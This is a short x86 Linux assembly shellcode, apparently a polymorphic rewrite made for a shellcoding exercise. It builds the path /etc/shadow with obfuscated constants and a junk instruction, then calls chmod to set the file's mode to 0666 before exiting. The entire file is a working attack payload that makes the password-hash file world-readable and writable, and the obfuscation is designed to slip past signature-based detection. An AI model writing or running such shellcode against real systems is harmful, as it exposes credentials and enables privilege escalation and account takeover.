; Filename: poly-chmod-shadow.nasm

global _start

section .text
 
_start:
  xor edx, edx

  push byte 15
  pop eax
  push edx
  push byte 0x77
  cmp edi, 0xac           ;1. Redundant cmp instruction
  push word 0x6f64
  push 0x6168732f
  mov esi, 0x7b757f3f     ;2a. for next AND instruction
  and esi, 0xe7fee5ef     ;2b. AND values to get 0x6374652f
  push esi
  mov ebx, esp
  xor ecx, ecx
  push 438                ;3. Decimal 438 = Octal 666
  pop ecx
  int 0x80

  push byte 1
  pop eax
  int 0x80
